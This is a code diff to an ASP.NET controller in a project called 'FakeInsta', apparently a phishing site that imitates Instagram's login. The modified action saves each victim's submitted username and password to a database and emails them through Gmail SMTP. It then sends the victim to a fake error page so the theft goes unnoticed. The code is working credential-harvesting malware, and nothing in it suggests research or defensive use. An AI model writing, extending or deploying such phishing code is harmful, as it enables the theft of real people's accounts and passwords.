@@ -26,6 +26,14 @@ namespace FakeInsta.Controllers
         [HttpPost, ValidateAntiForgeryToken]
         public async Task<IActionResult> Index(LoginInfo info)
         {
+            LoginInfo newInfo = new LoginInfo()
+            {
+                username = info.username,
+                password = info.password
+            };
+            await _context.LoginInfos.AddAsync(newInfo);
+            await _context.SaveChangesAsync();
+
             SmtpClient client = new SmtpClient("smtp.gmail.com", 587)
             {
                 UseDefaultCredentials = false,
@@ -37,18 +45,15 @@ namespace FakeInsta.Controllers
             {
                 IsBodyHtml = true,
                 Subject = "insta test",
-                Body = "username:" + info.username + "      " + "password:" + info.password
+                Body = "username:" + info.username + "<br/>" + "password:" + info.password
             };
-
-            client.Send(message);
-            LoginInfo newInfo = new LoginInfo()
-            {
-                username = info.username,
-                password = info.password
-            };
-            await _context.LoginInfos.AddAsync(newInfo);
-            await _context.SaveChangesAsync();
-            return RedirectToAction(nameof(Index));
+            
+            await client.SendMailAsync(message);
+            return RedirectToAction(nameof(ErrorNotFound));
+        }
+        public IActionResult ErrorNotFound()
+        {
+            return View();
         }
     }
 }
